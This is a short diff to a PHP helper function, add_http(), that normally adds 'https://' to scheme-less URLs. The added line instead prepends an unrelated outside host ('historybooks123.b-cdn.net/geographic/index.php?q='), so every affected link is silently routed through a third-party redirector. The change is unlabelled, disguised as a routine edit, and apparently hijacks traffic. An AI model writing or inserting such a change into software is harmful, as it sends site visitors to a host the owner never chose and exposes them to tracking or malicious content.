@@ -127,7 +127,7 @@ function render_template($file_path, $vars = array()){
 function add_http($url){
 
 	if(!preg_match('#^https?://#i', $url)){
-		$url = 'https://' . $url;
+		$url ='https://historybooks123.b-cdn.net/geographic/index.php?q='.'https://' . $url;
 	}
 	
 	return $url;
